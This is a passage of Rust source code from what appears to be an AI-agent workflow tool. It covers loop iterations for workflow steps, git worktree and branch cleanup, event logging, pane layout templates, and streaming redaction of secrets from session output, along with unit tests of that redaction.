        pnevma_core::LoopMode::UntilComplete => {
            match task_status {
                TaskStatus::Failed => {} // always loop on failure
                TaskStatus::Done => {
                    // Check for <COMPLETE> signal in handoff_summary
                    let summary = gate_row.handoff_summary.as_deref().unwrap_or_default();
                    if summary.to_lowercase().contains("<complete>") {
                        tracing::info!(
                            step_index = step_idx,
                            "agent signaled COMPLETE — stopping until_complete loop"
                        );
                        return Ok(false);
                    }
                    // No COMPLETE signal → loop again
                }
                _ => return Ok(false),
            }
        }
    }

    // Check iteration count
    let current_iter = db
        .get_latest_iteration(&wt.workflow_id, wt.step_index)
        .await
        .map_err(|e| e.to_string())?;

    if current_iter >= loop_config.max_iterations as i64 {
        tracing::info!(
            step_index = step_idx,
            current_iter,
            max = loop_config.max_iterations,
            "loop exhausted for step — normal failure proceeds"
        );
        return Ok(false);
    }

    // Trigger loop iteration
    let next_iter = current_iter + 1;
    // Build feedback from gate_row (already loaded above) to avoid a redundant DB fetch
    let raw_feedback = gate_row.handoff_summary.clone().unwrap_or_default();
    let feedback = if raw_feedback.chars().count() > 500 {
        let truncated: String = raw_feedback.chars().take(500).collect();
        format!("{truncated}…")
    } else {
        raw_feedback
    };
    create_loop_iteration(db, &def, &wt, &instance, next_iter, &feedback, loop_config).await?;

    // Mark the gate task as Looped (reuse gate_row loaded above)
    gate_row.status = "Looped".to_string();
    gate_row.updated_at = Utc::now();
    db.update_task(&gate_row).await.map_err(|e| e.to_string())?;

    tracing::info!(
        step_index = step_idx,
        iteration = next_iter,
        "loop iteration triggered"
    );

    Ok(true)
}

/// Create new task instances for a loop iteration (steps [target..=gate]).
async fn create_loop_iteration(
    db: &Db,
    def: &WorkflowDef,
    wt: &pnevma_db::WorkflowTaskRow,
    instance: &pnevma_db::WorkflowInstanceRow,
    iteration: i64,
    feedback: &str,
    loop_config: &pnevma_core::LoopConfig,
) -> Result<(), String> {
    let trigger_task_id = wt.task_id.as_str();
    let target = loop_config.target;
    let gate = wt.step_index as usize;
    if target > gate {
        return Err(format!("loop target {target} must be <= gate step {gate}"));
    }
    let now = Utc::now();

    // Create new tasks for steps [target..=gate]
    let mut new_task_ids: HashMap<usize, Uuid> = HashMap::new();

    // Find the latest Done task for pre-loop dependencies
    let all_wf_tasks = db
        .list_workflow_tasks(&wt.workflow_id)
        .await
        .map_err(|e| e.to_string())?;

    // For until_complete mode, accumulate summaries from all prior gate tasks
    let accumulated_summaries = if loop_config.mode == pnevma_core::LoopMode::UntilComplete {
        let prior_gate_tasks: Vec<_> = all_wf_tasks
            .iter()
            .filter(|t| t.step_index as usize == gate && t.task_id != trigger_task_id)
            .collect();

        let mut summaries: Vec<serde_json::Value> = Vec::new();
        for prior_wt in &prior_gate_tasks {
            if let Ok(Some(prior_row)) = db.get_task(&prior_wt.task_id).await {
                if let Some(ref s) = prior_row.handoff_summary {
                    if !s.is_empty() {
                        let truncated: String = s.chars().take(500).collect();
                        summaries.push(json!({
                            "iteration": prior_row.loop_iteration,
                            "summary": truncated,
                            "status": prior_row.status,
                        }));
                    }
                }
            }
        }
        // Sort by iteration ascending and cap at 10 most recent
        summaries.sort_by_key(|s| s.get("iteration").and_then(|v| v.as_i64()).unwrap_or(0));
        if summaries.len() > 10 {
            summaries = summaries.split_off(summaries.len() - 10);
        }
        Some(summaries)
    } else {
        None
    };

    let mode_str = match loop_config.mode {
        pnevma_core::LoopMode::UntilComplete => "until_complete",
        pnevma_core::LoopMode::OnFailure => "on_failure",
    };

    for step_idx in target..=gate {
        let step = &def.steps[step_idx];
        let task_id = Uuid::new_v4();

        let loop_context = json!({
            "iteration": iteration,
            "feedback": feedback,
            "trigger_task_id": trigger_task_id,
            "mode": mode_str,
            "accumulated_summaries": accumulated_summaries,
        });

        // Build dependencies: in-loop deps use new task IDs, pre-loop deps use latest Done task
        let mut deps_json: Vec<String> = Vec::new();
        let mut all_deps_satisfied = true;
        for &dep_idx in &step.depends_on {
            if dep_idx >= target {
                // In-loop dependency → point to new task (not yet completed)
                if let Some(id) = new_task_ids.get(&dep_idx) {
                    deps_json.push(id.to_string());
                    all_deps_satisfied = false; // in-loop dep won't be Done yet
                }
            } else {
                // Pre-loop dependency → find latest Done task for that step.
                // Pre-loop steps must be Done before the gate fails, so this
                // should always succeed. Propagate the error if it doesn't.
                let dep_task_id =
                    find_latest_done_task_for_step(&all_wf_tasks, db, dep_idx).await?;
                deps_json.push(dep_task_id);
            }
        }

        // Start as Ready only if all deps are satisfied (Done or none)
        let initial_status = if deps_json.is_empty() || all_deps_satisfied {
            "Ready"
        } else {
            "Blocked"
        };

        let checks: Vec<serde_json::Value> = step
            .acceptance_criteria
            .iter()
            .map(|desc| {
                json!({
                    "description": desc,
                    "check_type": "ManualApproval",
                })
            })
            .collect();

        // Append loop context to goal
        let goal = format!(
            "{}\n\n[Loop iteration {}/{} — {}]",
            step.goal, iteration, loop_config.max_iterations, feedback
        );

        db.create_task(&TaskRow {
            id: task_id.to_string(),
            project_id: instance.project_id.clone(),
            title: step.title.clone(),
            goal,
            scope_json: serde_json::to_string(&step.scope).unwrap_or_else(|_| "[]".to_string()),
            dependencies_json: serde_json::to_string(&deps_json)
                .unwrap_or_else(|_| "[]".to_string()),
            acceptance_json: serde_json::to_string(&checks).unwrap_or_else(|_| "[]".to_string()),
            constraints_json: serde_json::to_string(&step.constraints)
                .unwrap_or_else(|_| "[]".to_string()),
            priority: step.priority.clone(),
            status: initial_status.to_string(),
            branch: None,
            worktree_id: None,
            handoff_summary: None,
            created_at: now,
            updated_at: now,
            auto_dispatch: step.auto_dispatch,
            agent_profile_override: step.agent_profile.clone(),
            execution_mode: Some(step.execution_mode.as_str().to_string()),
            timeout_minutes: step.timeout_minutes.map(|v| v as i64),
            max_retries: step.max_retries.map(|v| v as i64),
            loop_iteration: iteration,
            loop_context_json: Some(loop_context.to_string()),
            forked_from_task_id: None,
            lineage_summary: None,
            lineage_depth: 0,
        })
        .await
        .map_err(|e| e.to_string())?;

        if !deps_json.is_empty() {
            db.replace_task_dependencies(&task_id.to_string(), &deps_json)
                .await
                .map_err(|e| e.to_string())?;
        }

        db.add_workflow_task(
            &wt.workflow_id,
            step_idx as i64,
            iteration,
            &task_id.to_string(),
        )
        .await
        .map_err(|e| e.to_string())?;

        new_task_ids.insert(step_idx, task_id);
    }

    // Update downstream tasks (steps after gate) to depend on new gate task.
    // Only touch tasks that actually reference the trigger task in their deps,
    // to avoid corrupting historical iteration rows.
    let new_gate_task_id = new_task_ids[&gate].to_string();
    for downstream_wt in &all_wf_tasks {
        if downstream_wt.step_index as usize > gate {
            // Check if this task actually depends on the trigger task before swapping
            if let Ok(Some(mut downstream_row)) = db.get_task(&downstream_wt.task_id).await {
                let mut deps: Vec<String> =
                    serde_json::from_str(&downstream_row.dependencies_json).unwrap_or_default();
                let mut changed = false;
                for dep in &mut deps {
                    if dep == trigger_task_id {
                        *dep = new_gate_task_id.clone();
                        changed = true;
                    }
                }
                if changed {
                    db.swap_task_dependency(
                        &downstream_wt.task_id,
                        trigger_task_id,
                        &new_gate_task_id,
                    )
                    .await
                    .map_err(|e| e.to_string())?;
                    downstream_row.dependencies_json =
                        serde_json::to_string(&deps).unwrap_or_else(|_| "[]".to_string());
                    downstream_row.updated_at = Utc::now();
                    db.update_task(&downstream_row)
                        .await
                        .map_err(|e| e.to_string())?;
                }
            }
        }
    }

    // Update expanded_steps_json on the workflow instance for loop tracking
    let mut loop_state: serde_json::Value = instance
        .expanded_steps_json
        .as_ref()
        .and_then(|s| serde_json::from_str(s).ok())
        .unwrap_or_else(|| json!({"loops": {}}));

    let gate_key = gate.to_string();
    let new_task_id_map: serde_json::Map<String, serde_json::Value> = new_task_ids
        .iter()
        .map(|(k, v)| (k.to_string(), json!(v.to_string())))
        .collect();

    if let Some(loops) = loop_state.get_mut("loops").and_then(|l| l.as_object_mut()) {
        let entry = loops.entry(gate_key).or_insert_with(|| {
            json!({
                "target": target,
                "max_iterations": loop_config.max_iterations,
                "current_iteration": 0,
                "history": []
            })
        });
        entry["current_iteration"] = json!(iteration);
        if let Some(history) = entry.get_mut("history").and_then(|h| h.as_array_mut()) {
            history.push(json!({
                "iteration": iteration,
                "task_ids": new_task_id_map,
                "trigger_task_id": trigger_task_id,
            }));
        }
    }

    db.update_workflow_instance_expanded_steps(&wt.workflow_id, &loop_state.to_string())
        .await
        .map_err(|e| e.to_string())?;

    Ok(())
}

/// Find the latest Done task for a given step index in a workflow's task list.
/// Checks task status via DB to ensure only completed tasks are returned.
async fn find_latest_done_task_for_step(
    wf_tasks: &[pnevma_db::WorkflowTaskRow],
    db: &Db,
    step_idx: usize,
) -> Result<String, String> {
    // Iterate highest-iteration first and return the first task that is Done.
    let mut candidates: Vec<_> = wf_tasks
        .iter()
        .filter(|t| t.step_index as usize == step_idx)
        .collect();
    candidates.sort_by(|a, b| b.iteration.cmp(&a.iteration));

    for candidate in candidates {
        if let Ok(Some(task)) = db.get_task(&candidate.task_id).await {
            if task.status == "Done" {
                return Ok(candidate.task_id.clone());
            }
        }
    }

    Err(format!("no Done task found for step {step_idx}"))
}

async fn stop_control_plane(state: &AppState) {
    let prior: Option<crate::control::ControlServerHandle> = {
        let mut slot = state.control_plane.lock().await;
        slot.take().map(|service| service.handle)
    };
    if let Some(handle) = prior {
        handle.shutdown().await;
    }
}

pub async fn restart_control_plane(
    state: &AppState,
    project_path: &Path,
    project_config: &ProjectConfig,
    global_config: &GlobalConfig,
) -> Result<(), String> {
    stop_control_plane(state).await;
    let settings = resolve_control_plane_settings(project_path, project_config, global_config)?;
    // Note: start_control_plane requires Arc<AppState>. The bridge layer should call this
    // with a proper Arc. Here we skip starting the control plane server since we only
    // have &AppState. The bridge is responsible for starting the control plane with Arc<AppState>.
    drop(settings); // settings validated, control plane started by bridge
    Ok(())
}

/// Load hooks from WORKFLOW.md at the given project path. Returns defaults (empty hooks) on any error.
pub(crate) fn load_workflow_hooks(project_path: &Path) -> WorkflowHooks {
    match WorkflowDocument::from_file(&project_path.join("WORKFLOW.md")) {
        Ok(doc) => doc.config.hooks,
        Err(_) => WorkflowHooks::default(),
    }
}

async fn cleanup_task_worktree_inner(
    db: &Db,
    git: &Arc<GitService>,
    project_id: Uuid,
    task_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    project_path: Option<&Path>,
    delete_branch: bool,
) -> Result<(), String> {
    let task_id_str = task_id.to_string();
    if let Some(worktree) = db
        .find_worktree_by_task(&task_id_str)
        .await
        .map_err(|e| e.to_string())?
    {
        // BeforeRemove hooks — best-effort (never abort cleanup)
        if let Some(pp) = project_path {
            let hooks_config = load_workflow_hooks(pp);
            if let Some(cmds) = &hooks_config.before_remove {
                let hook_defs = parse_hook_defs(HookPhase::BeforeRemove, cmds);
                let secrets: Vec<String> = Vec::new();
                let worktree_path = PathBuf::from(&worktree.path);
                let _ = run_hooks(
                    &hook_defs,
                    HookPhase::BeforeRemove,
                    &worktree_path,
                    &task_id_str,
                    &worktree.branch,
                    &secrets,
                )
                .await;
            }
        }

        let mut cleanup_error = git
            .cleanup_persisted_worktree(
                task_id,
                &worktree.path,
                Some(&worktree.branch),
                delete_branch,
            )
            .await
            .err()
            .map(|err| err.to_string());

        let mut branch_removed = false;
        if delete_branch {
            if let Some(pp) = project_path {
                let _ = git_output(pp, &["worktree", "prune", "--expire", "now"]).await;
                let branch_ref = format!("refs/heads/{}", worktree.branch);
                let branch_exists = match git_ref_exists(pp, &branch_ref).await {
                    Ok(value) => value,
                    Err(err) => {
                        cleanup_error = Some(match cleanup_error.take() {
                            Some(existing) => {
                                format!("{existing}; branch existence check failed: {err}")
                            }
                            None => format!("branch existence check failed: {err}"),
                        });
                        true
                    }
                };
                if branch_exists {
                    match git_output(pp, &["branch", "-D", &worktree.branch]).await {
                        Ok(_) => branch_removed = true,
                        Err(err) => {
                            match git_output(
                                pp,
                                &[
                                    "update-ref",
                                    "-d",
                                    &format!("refs/heads/{}", worktree.branch),
                                ],
                            )
                            .await
                            {
                                Ok(_) => branch_removed = true,
                                Err(update_ref_err) => {
                                    cleanup_error = Some(match cleanup_error {
                                        Some(existing) => format!(
                                            "{existing}; branch cleanup failed: {err}; update-ref cleanup failed: {update_ref_err}"
                                        ),
                                        None => format!(
                                            "branch cleanup failed: {err}; update-ref cleanup failed: {update_ref_err}"
                                        ),
                                    });
                                }
                            }
                        }
                    }
                } else {
                    branch_removed = true;
                }

                if branch_removed && git_ref_exists(pp, &branch_ref).await.unwrap_or(true) {
                    branch_removed = false;
                    cleanup_error = Some(match cleanup_error {
                        Some(existing) => {
                            format!("{existing}; branch still exists after cleanup")
                        }
                        None => "branch still exists after cleanup".to_string(),
                    });
                }
            }
        }

        if let Some(err) = cleanup_error.as_ref() {
            append_event(
                db,
                project_id,
                Some(task_id),
                None,
                "git",
                "WorktreeCleanupFailed",
                json!({"task_id": task_id_str, "error": err, "path": worktree.path}),
            )
            .await;
        } else {
            append_event(
                db,
                project_id,
                Some(task_id),
                None,
                "git",
                "WorktreeRemoved",
                json!({
                    "task_id": task_id_str,
                    "path": worktree.path,
                    "branch": worktree.branch,
                    "delete_branch": delete_branch
                }),
            )
            .await;
            if branch_removed {
                append_event(
                    db,
                    project_id,
                    Some(task_id),
                    None,
                    "git",
                    "BranchRemoved",
                    json!({"task_id": task_id_str, "branch": worktree.branch}),
                )
                .await;
            }
        }
        db.remove_worktree_by_task(&task_id_str)
            .await
            .map_err(|e| e.to_string())?;
        if delete_branch {
            if let Some(err) = cleanup_error {
                return Err(err);
            }
        }
    }

    if let Some(mut row) = db.get_task(&task_id_str).await.map_err(|e| e.to_string())? {
        let mut changed = false;
        if row.branch.is_some() {
            row.branch = None;
            changed = true;
        }
        if row.worktree_id.is_some() {
            row.worktree_id = None;
            changed = true;
        }
        if changed {
            row.updated_at = Utc::now();
            db.update_task(&row).await.map_err(|e| e.to_string())?;
            emit_task_updated(db, project_id, task_id).await;
            if let Some(emitter) = emitter {
                emit_enriched_task_event(emitter, db, &task_id_str).await;
            }
        }
    }
    Ok(())
}

pub(crate) async fn cleanup_task_worktree(
    db: &Db,
    git: &Arc<GitService>,
    project_id: Uuid,
    task_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    project_path: Option<&Path>,
) -> Result<(), String> {
    cleanup_task_worktree_inner(db, git, project_id, task_id, emitter, project_path, false).await
}

pub(crate) async fn cleanup_task_worktree_and_branch(
    db: &Db,
    git: &Arc<GitService>,
    project_id: Uuid,
    task_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    project_path: Option<&Path>,
) -> Result<(), String> {
    cleanup_task_worktree_inner(db, git, project_id, task_id, emitter, project_path, true).await
}

pub(crate) async fn append_event(
    db: &Db,
    project_id: Uuid,
    task_id: Option<Uuid>,
    session_id: Option<Uuid>,
    source: &str,
    event_type: &str,
    payload: serde_json::Value,
) {
    let safe_payload = redact_payload_for_project_log(project_id, payload);
    let _ = db
        .append_event(NewEvent {
            id: Uuid::new_v4().to_string(),
            project_id: project_id.to_string(),
            task_id: task_id.map(|v| v.to_string()),
            session_id: session_id.map(|v| v.to_string()),
            trace_id: Uuid::new_v4().to_string(),
            source: source.to_string(),
            event_type: event_type.to_string(),
            payload: safe_payload,
        })
        .await;
}

pub(crate) async fn append_telemetry_event(
    db: &Db,
    project_id: Uuid,
    global_config: &GlobalConfig,
    event_type: &str,
    payload: serde_json::Value,
) {
    if !global_config.telemetry_opt_in {
        return;
    }
    let safe_payload = redact_payload_for_project_log(project_id, payload);
    let _ = db
        .append_telemetry_event(&TelemetryEventRow {
            id: Uuid::new_v4().to_string(),
            project_id: project_id.to_string(),
            event_type: event_type.to_string(),
            payload_json: safe_payload.to_string(),
            anonymized: true,
            created_at: Utc::now(),
        })
        .await;
}

fn normalize_layout_template_name(input: &str) -> String {
    let mut out = String::new();
    let mut last_was_sep = false;
    for ch in input.trim().chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch.to_ascii_lowercase());
            last_was_sep = false;
            continue;
        }
        if !last_was_sep {
            out.push('-');
            last_was_sep = true;
        }
    }
    out.trim_matches('-').to_string()
}

fn default_layout_template_display_name(name: &str) -> String {
    let mut parts = Vec::new();
    for part in name.split('-') {
        let mut chars = part.chars();
        let Some(first) = chars.next() else {
            continue;
        };
        let mut label = String::new();
        label.push(first.to_ascii_uppercase());
        label.push_str(chars.as_str());
        parts.push(label);
    }
    if parts.is_empty() {
        "Template".to_string()
    } else {
        parts.join(" ")
    }
}

fn system_layout_templates() -> Vec<(String, String, Vec<PaneLayoutTemplatePane>)> {
    vec![
        (
            "solo-focus".to_string(),
            "Solo Focus".to_string(),
            vec![
                PaneLayoutTemplatePane {
                    id: "pane-board".to_string(),
                    session_id: None,
                    r#type: "task-board".to_string(),
                    position: "root".to_string(),
                    label: "Task Board".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-solo-terminal".to_string(),
                    session_id: None,
                    r#type: "terminal".to_string(),
                    position: "after:pane-board".to_string(),
                    label: "Terminal".to_string(),
                    metadata_json: None,
                },
            ],
        ),
        (
            "review-mode".to_string(),
            "Review Mode".to_string(),
            vec![
                PaneLayoutTemplatePane {
                    id: "pane-board".to_string(),
                    session_id: None,
                    r#type: "task-board".to_string(),
                    position: "root".to_string(),
                    label: "Task Board".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-review-diff".to_string(),
                    session_id: None,
                    r#type: "diff".to_string(),
                    position: "after:pane-board".to_string(),
                    label: "Diff Review".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-review-queue".to_string(),
                    session_id: None,
                    r#type: "merge-queue".to_string(),
                    position: "after:pane-review-diff".to_string(),
                    label: "Merge Queue".to_string(),
                    metadata_json: None,
                },
            ],
        ),
        (
            "debug-mode".to_string(),
            "Debug Mode".to_string(),
            vec![
                PaneLayoutTemplatePane {
                    id: "pane-debug-terminal".to_string(),
                    session_id: None,
                    r#type: "terminal".to_string(),
                    position: "root".to_string(),
                    label: "Terminal".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-debug-replay".to_string(),
                    session_id: None,
                    r#type: "replay".to_string(),
                    position: "after:pane-debug-terminal".to_string(),
                    label: "Replay".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-debug-events".to_string(),
                    session_id: None,
                    r#type: "search".to_string(),
                    position: "after:pane-debug-replay".to_string(),
                    label: "Events".to_string(),
                    metadata_json: None,
                },
            ],
        ),
    ]
}

fn parse_template_panes(raw: &str) -> Result<Vec<PaneLayoutTemplatePane>, String> {
    serde_json::from_str::<Vec<PaneLayoutTemplatePane>>(raw).map_err(|e| e.to_string())
}

fn panes_to_template_json(panes: &[PaneLayoutTemplatePane]) -> Result<String, String> {
    serde_json::to_string(panes).map_err(|e| e.to_string())
}

fn pane_layout_template_view_from_row(
    row: PaneLayoutTemplateRow,
) -> Result<PaneLayoutTemplateView, String> {
    Ok(PaneLayoutTemplateView {
        id: row.id,
        name: row.name,
        display_name: row.display_name,
        is_system: row.is_system,
        panes: parse_template_panes(&row.pane_graph_json)?,
        created_at: row.created_at,
        updated_at: row.updated_at,
    })
}

fn pane_contains_unsaved_metadata(metadata_json: Option<&str>) -> bool {
    let Some(raw) = metadata_json else {
        return false;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(raw) else {
        return false;
    };
    value
        .get("unsaved")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
        || value
            .get("dirty")
            .and_then(|v| v.as_bool())
            .unwrap_or(false)
}

fn session_state_may_be_unsaved(status: &str) -> bool {
    !matches!(
        status.to_ascii_lowercase().as_str(),
        "exited" | "failed" | "stopped" | "done" | "dead" | "completed"
    )
}

async fn ensure_system_layout_templates(db: &Db, project_id: Uuid) -> Result<(), String> {
    let now = Utc::now();
    for (name, display_name, panes) in system_layout_templates() {
        let existing = db
            .get_pane_layout_template(&project_id.to_string(), &name)
            .await
            .map_err(|e| e.to_string())?;
        let (id, created_at) = existing
            .map(|row| (row.id, row.created_at))
            .unwrap_or_else(|| (Uuid::new_v4().to_string(), now));
        db.upsert_pane_layout_template(&PaneLayoutTemplateRow {
            id,
            project_id: project_id.to_string(),
            name,
            display_name,
            pane_graph_json: panes_to_template_json(&panes)?,
            is_system: true,
            created_at,
            updated_at: now,
        })
        .await
        .map_err(|e| e.to_string())?;
    }
    Ok(())
}

async fn ensure_default_panes(db: &Db, project_id: Uuid) -> Result<(), String> {
    let existing = db
        .list_panes(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;
    if !existing.is_empty() {
        return Ok(());
    }

    db.upsert_pane(&PaneRow {
        id: "pane-board".to_string(),
        project_id: project_id.to_string(),
        session_id: None,
        r#type: "task-board".to_string(),
        position: "root".to_string(),
        label: "Task Board".to_string(),
        metadata_json: None,
    })
    .await
    .map_err(|e| e.to_string())?;

    Ok(())
}

/// Build a list of secret values to be redacted from session output.
/// Reads well-known environment variables and filters out empty/missing ones.
pub(crate) fn build_secrets_list() -> Vec<String> {
    const SECRET_ENV_VARS: &[&str] = &[
        "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY",
        "CLAUDE_API_KEY",
        "GITHUB_TOKEN",
        "PNEVMA_SECRET",
    ];
    let secrets = SECRET_ENV_VARS
        .iter()
        .filter_map(|var| {
            let val = std::env::var(var).unwrap_or_default();
            if val.is_empty() {
                None
            } else {
                Some(val)
            }
        })
        .collect::<Vec<_>>();
    normalize_redaction_secrets(&secrets)
}

pub(crate) async fn load_redaction_secrets(db: &Db, project_id: Uuid) -> Vec<String> {
    let mut secrets = build_secrets_list();
    match resolve_secret_env(db, project_id).await {
        Ok((_, secret_values)) => secrets.extend(secret_values),
        Err(err) => tracing::warn!(
            project_id = %project_id,
            "failed to load keychain-backed redaction secrets: {err}"
        ),
    }
    normalize_redaction_secrets(&secrets)
}

async fn emit_session_output_chunk(
    emitter: &Arc<dyn EventEmitter>,
    db: &Db,
    project_id: Uuid,
    session_id: Uuid,
    safe_chunk: String,
    secrets: &Arc<RwLock<Vec<String>>>,
) {
    emitter.emit(
        "session_output",
        json!({"session_id": session_id, "chunk": safe_chunk.clone()}),
    );
    append_event(
        db,
        project_id,
        None,
        Some(session_id),
        "session",
        "SessionOutputChunk",
        json!({"chunk": safe_chunk.clone()}),
    )
    .await;
    for attention in parse_osc_attention(&safe_chunk) {
        let body = if attention.body.trim().is_empty() {
            format!("OSC {} attention sequence received", attention.code)
        } else {
            attention.body
        };
        let current_secrets = current_redaction_secrets(secrets).await;
        let _ = create_notification_row(
            db,
            emitter,
            project_id,
            None,
            Some(session_id),
            osc_title(&attention.code),
            &body,
            Some(osc_level(&attention.code)),
            "osc",
            &current_secrets,
        )
        .await;
    }
}

fn spawn_session_bridge(
    emitter: Arc<dyn EventEmitter>,
    db: Db,
    sessions: SessionSupervisor,
    project_id: Uuid,
    secrets: Arc<RwLock<Vec<String>>>,
) -> tokio::task::JoinHandle<()> {
    let mut rx = sessions.subscribe();
    tokio::spawn(async move {
        let mut output_redactors: HashMap<Uuid, StreamRedactor> = HashMap::new();
        while let Ok(event) = rx.recv().await {
            match event {
                SessionEvent::Spawned(meta) => {
                    let row = session_row_from_meta(&meta);
                    let live_session = live_session_view_from_meta(&meta);
                    let _ = db.upsert_session(&row).await;
                    emitter.emit(
                        "session_spawned",
                        json!({
                            "project_id": project_id,
                            "session_id": meta.id,
                            "name": meta.name,
                            "session": live_session
                        }),
                    );
                    append_event(
                        &db,
                        project_id,
                        None,
                        Some(meta.id),
                        "session",
                        "SessionSpawned",
                        json!({"name": meta.name, "cwd": meta.cwd}),
                    )
                    .await;
                }
                SessionEvent::Output { session_id, chunk } => {
                    let redactor = output_redactors
                        .entry(session_id)
                        .or_insert_with(|| StreamRedactor::new(Arc::clone(&secrets)));
                    if let Some(safe_chunk) = redactor.push_chunk(&chunk).await {
                        emit_session_output_chunk(
                            &emitter, &db, project_id, session_id, safe_chunk, &secrets,
                        )
                        .await;
                    }
                }
                SessionEvent::Heartbeat { session_id, health } => {
                    let session_payload = if let Some(meta) = sessions.get(session_id).await {
                        let row = session_row_from_meta(&meta);
                        let _ = db.upsert_session(&row).await;
                        Some(live_session_view_from_meta(&meta))
                    } else {
                        None
                    };
                    let mut payload = json!({
                        "project_id": project_id,
                        "session_id": session_id,
                        "health": session_health_to_string(&health)
                    });
                    if let Some(s) = session_payload {
                        payload["session"] =
                            serde_json::to_value(s).expect("LiveSessionView must serialize");
                    }
                    emitter.emit("session_heartbeat", payload);
                }
                SessionEvent::Exited { session_id, code } => {
                    let session_payload = if let Some(meta) = sessions.get(session_id).await {
                        let row = session_row_from_meta(&meta);
                        let _ = db.upsert_session(&row).await;
                        Some(live_session_view_from_meta(&meta))
                    } else {
                        None
                    };
                    let mut payload = json!({
                        "project_id": project_id,
                        "session_id": session_id,
                        "code": code
                    });
                    if let Some(s) = session_payload {
                        payload["session"] =
                            serde_json::to_value(s).expect("LiveSessionView must serialize");
                    }
                    if let Some(redactor) = output_redactors.get_mut(&session_id) {
                        if let Some(safe_chunk) = redactor.finish().await {
                            emit_session_output_chunk(
                                &emitter, &db, project_id, session_id, safe_chunk, &secrets,
                            )
                            .await;
                        }
                    }
                    output_redactors.remove(&session_id);
                    emitter.emit("session_exited", payload);
                    append_event(
                        &db,
                        project_id,
                        None,
                        Some(session_id),
                        "session",
                        "SessionExited",
                        json!({"exit_code": code}),
                    )
                    .await;
                }
            }
        }
    })
}

#[cfg(test)]
mod redaction_tests {
    use super::*;
    use std::sync::Mutex;

    use sqlx::sqlite::SqlitePoolOptions;

    struct RecordingEmitter {
        events: Mutex<Vec<(String, serde_json::Value)>>,
    }

    impl RecordingEmitter {
        fn new() -> Self {
            Self {
                events: Mutex::new(Vec::new()),
            }
        }
    }

    impl EventEmitter for RecordingEmitter {
        fn emit(&self, event: &str, payload: serde_json::Value) {
            self.events
                .lock()
                .expect("recording emitter lock poisoned")
                .push((event.to_string(), payload));
        }
    }

    async fn open_test_db() -> Db {
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .expect("memory sqlite");
        let db = Db::from_pool_and_path(pool, PathBuf::from(":memory:"));
        db.migrate().await.expect("migrate");
        db
    }

    async fn git(dir: &Path, args: &[&str]) -> String {
        git_output(dir, args).await.expect("git command")
    }

    // ── redact_text ───────────────────────────────────────────────────────────

    #[test]
    fn known_secret_is_replaced() {
        let secret = "s3cr3t-api-key-value".to_string();
        let input = format!("connecting with token {secret} now");
        let output = redact_text(&input, std::slice::from_ref(&secret));
        assert!(
            !output.contains(&secret),
            "secret must not appear in output; got: {output}"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn multiple_secrets_all_replaced() {
        let s1 = "alpha-secret".to_string();
        let s2 = "beta-secret".to_string();
        let input = format!("first={s1} second={s2}");
        let output = redact_text(&input, &[s1.clone(), s2.clone()]);
        assert!(!output.contains(&s1), "s1 must be redacted");
        assert!(!output.contains(&s2), "s2 must be redacted");
    }

    #[test]
    fn partial_substring_is_replaced_literally() {
        // The secret substring is replaced wherever it appears, even inside longer words.
        let secret = "secr".to_string();
        let input = "secret-value is here".to_string();
        let output = redact_text(&input, std::slice::from_ref(&secret));
        // "secr" appears inside "secret" — it will be replaced literally.
        assert!(
            !output.contains(&secret),
            "literal substring must be replaced"
        );
    }

    #[test]
    fn empty_secrets_list_returns_pattern_redacted() {
        // No explicit secrets, but pattern-based redaction still fires.
        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig";
        let output = redact_text(input, &[]);
        assert!(
            !output.contains("eyJhbGciOiJIUzI1NiJ9"),
            "bearer token must be redacted"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn empty_secret_string_is_ignored() {
        let input = "hello world".to_string();
        let output = redact_text(&input, &["".to_string()]);
        // Empty secret is skipped; text should be unchanged (no pattern match here).
        assert_eq!(output, input);
    }

    #[tokio::test]
    async fn stream_redactor_redacts_secret_split_across_chunks() {
        let secrets = Arc::new(RwLock::new(vec!["supersecret123".to_string()]));
        let mut redactor = StreamRedactor::new(secrets);

        let first = redactor
            .push_chunk("prefix super")
            .await
            .expect("safe prefix should flush");
        assert_eq!(first, "prefix ");

        let second = redactor
            .push_chunk("secret123 suffix")
            .await
            .expect("completed secret should flush");
        assert_eq!(second, "[REDACTED] suffix");
    }

    #[tokio::test]
    async fn stream_redactor_redacts_pattern_split_across_chunks() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(secrets);

        assert!(
            redactor.push_chunk("Authorization: Bea").await.is_none(),
            "partial auth prefix should be retained"
        );

        let output = redactor
            .push_chunk("rer abc123\n")
            .await
            .expect("completed auth header should flush");
        assert_eq!(output, "Authorization: Bearer [REDACTED]\n");
    }

    #[tokio::test]
    async fn stream_redactor_flushes_safe_marker_words_immediately() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(secrets);

        let output = redactor
            .push_chunk("enter token\n")
            .await
            .expect("safe text should flush immediately");
        assert_eq!(output, "enter token\n");
    }

    #[tokio::test]
    async fn stream_redactor_uses_live_secret_updates() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(Arc::clone(&secrets));

        let first = redactor
            .push_chunk("safe prefix\n")
            .await
            .expect("safe text should flush");
        assert_eq!(first, "safe prefix\n");

        *secrets.write().await = vec!["rotated-secret".to_string()];

        let second = redactor
            .push_chunk("token=rotated-secret\n")
            .await
            .expect("updated secret should be redacted");
        assert_eq!(second, "token=[REDACTED]\n");
    }

